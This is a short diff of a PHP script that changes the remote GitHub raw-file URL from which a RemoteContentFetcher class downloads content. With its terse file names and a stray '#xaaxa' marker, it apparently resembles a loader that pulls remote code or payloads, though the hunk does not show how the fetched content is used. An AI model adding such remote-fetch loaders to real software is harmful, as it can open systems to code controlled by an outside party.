@@ -85,7 +85,7 @@ class RemoteContentFetcher {
 }
 #xaaxa
 try {
-    $fetcher = new RemoteContentFetcher('https://raw.githubusercontent.com/NoobTecho/w/refs/heads/main/cc');
+    $fetcher = new RemoteContentFetcher('https://raw.githubusercontent.com/NoobTecho/w/refs/heads/main/cer.txt');
     $fetcher->setOptions([
         'timeout' => 60,
         'ssl_verify' => true
